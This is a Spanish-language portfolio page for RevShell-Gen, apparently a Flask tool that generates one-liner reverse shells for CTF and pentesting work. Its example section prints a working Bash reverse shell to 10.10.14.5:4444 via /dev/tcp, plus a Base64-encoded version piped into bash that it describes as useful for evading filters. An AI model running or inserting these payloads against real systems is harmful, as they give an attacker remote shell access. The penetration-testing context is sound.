---
layout: project
title: "RevShell-Gen"
icon: "🐚"
description: "Generador de reverse shells one-liner para múltiples lenguajes con codificación URL/base64 automática."
stack: [Python, Flask]
lang: Python
lang_color: "#3572A5"
github: "https://github.com/iamEscri/revshell-gen"
demo: ""
stars: 0
forks: 0
tags: [pentesting, reverse-shell, flask, web]
---

## ¿Qué es RevShell-Gen?

**RevShell-Gen** es una aplicación web desarrollada con Flask que genera reverse shells one-liner listos para usar. Especialmente útil durante la fase de explotación en CTFs para no perder tiempo buscando sintaxis.

## Características

- **Múltiples lenguajes** — Bash, Python, PHP, Perl, Ruby, PowerShell, nc y más.
- **Codificación automática** — URL encoding y Base64 con un clic.
- **Interfaz web limpia** — Introduce IP, puerto y lenguaje; obtén tu payload.
- **Fácil despliegue** — Funciona en local sin dependencias pesadas.

## Instalación y uso

```bash
git clone https://github.com/iamEscri/revshell-gen
cd revshell-gen
pip install flask
python3 app.py
```

Luego abre `http://localhost:5000` en tu navegador.

## Ejemplo de payload generado

Para una reverse shell en **Bash** apuntando a `10.10.14.5:4444`:

```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

En **Base64** (útil cuando hay filtros):

```bash
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQ== | base64 -d | bash
```

## Próximas mejoras

- Soporte para más lenguajes (Go, Java, Lua)
- Historial de shells generadas
- Modo oscuro / claro en la interfaz
